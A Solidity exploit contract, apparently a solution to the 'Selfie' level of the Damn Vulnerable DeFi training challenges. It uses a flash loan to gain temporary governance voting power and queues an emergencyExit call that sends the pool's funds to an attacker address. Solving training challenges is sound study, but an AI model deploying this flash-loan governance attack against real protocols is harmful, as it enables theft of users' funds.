// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../../src/Contracts/selfie/SimpleGovernance.sol";
import "../../../src/Contracts/selfie/SelfiePool.sol";

contract Exploit is IERC3156FlashBorrower {
    SimpleGovernance public immutable gov;
    SelfiePool public immutable pool;
    DamnValuableTokenSnapshot public immutable govToken;
    address internal attacker;

    constructor(
        address _gov,
        address _pool,
        address _govToken,
        address _attacker
    ) {
        gov = SimpleGovernance(_gov);
        pool = SelfiePool(_pool);
        govToken = DamnValuableTokenSnapshot(_govToken);
        attacker = _attacker;
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(attacker)
        );
        pool.flashLoan(
            this,
            address(govToken),
            govToken.balanceOf(address(pool)),
            data
        );
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();
        gov.queueAction(address(pool), 0, data);
        DamnValuableTokenSnapshot(token).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
